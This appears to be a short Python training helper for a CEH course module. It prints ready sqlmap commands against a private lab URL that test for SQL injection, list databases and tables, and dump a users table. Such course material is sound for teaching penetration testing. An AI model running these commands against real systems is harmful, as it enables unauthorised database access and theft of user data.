#!/usr/bin/env python3
# LAB-ONLY: sqlmap Command Helper
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates common sqlmap commands for quick testing
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id=1"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: sqlmap Helper")
    print("="*80)
    print("# 1. Basic SQLi test:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" --batch")
    print()
    print("# 2. Get databases:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" --dbs --batch")
    print()
    print("# 3. Get tables from target DB:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" -D target_db --tables --batch")
    print()
    print("# 4. Dump all data from target table:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" -D target_db -T users --dump --batch")

if __name__ == "__main__":
    main()
